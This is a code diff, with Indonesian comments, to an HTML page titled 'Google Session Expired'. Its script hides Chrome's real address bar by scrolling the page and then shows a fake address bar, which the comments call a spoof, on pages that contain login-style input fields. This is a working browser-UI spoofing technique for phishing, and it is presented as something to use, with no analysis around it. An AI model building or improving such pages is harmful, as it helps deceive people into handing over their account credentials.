@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Loading...</title>
+<title>Google Session Expired</title>
 
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
@@ -10,11 +10,12 @@ html, body {
     margin:0;
     padding:0;
     font-family: Arial, sans-serif;
+    /* biarkan overscroll default supaya pull-to-refresh tetap jalan */
 }
 
-/* spacer untuk scroll natural */
+/* spacer untuk scroll */
 .spacer {
-    height:1800px;
+    height:1500px;
     background: linear-gradient(white, #ddd);
 }
 
@@ -33,7 +34,7 @@ html, body {
     font-size:14px;
     z-index:9999;
     opacity:0;
-    transition:0.2s;
+    transition:0.25s;
 }
 
 #fakebar.show {
@@ -64,7 +65,6 @@ input {
     border:1px solid #ccc;
 }
 </style>
-
 </head>
 
 <body>
@@ -85,19 +85,18 @@ input {
 
 <script>
 let fakebar = document.getElementById("fakebar");
-
 let lastScroll = 0;
 
 // deteksi scroll natural
 window.addEventListener("scroll", () => {
     let y = window.scrollY;
 
-    // saat scroll turun cukup jauh → kemungkinan address bar hidden
+    // tampilkan fake bar saat scroll ke bawah cukup jauh
     if (y > 150 && y > lastScroll) {
         fakebar.classList.add("show");
     }
 
-    // kalau user scroll naik → hilangkan spoof
+    // hilangkan fake bar saat scroll ke atas
     if (y < lastScroll) {
         fakebar.classList.remove("show");
     }
@@ -105,11 +104,12 @@ window.addEventListener("scroll", () => {
     lastScroll = y;
 });
 
-// dorong user ke scroll awal (natural)
+// scroll awal kecil supaya user bisa pull-to-refresh
 window.onload = () => {
     setTimeout(() => {
-        window.scrollTo({ top: 250, behavior: "smooth" });
-    }, 500);
+        // scroll sedikit saja, cukup untuk trigger auto-hide Chrome bar
+        window.scrollTo({ top: 50, behavior: "smooth" });
+    }, 300);
 };
 </script>
 
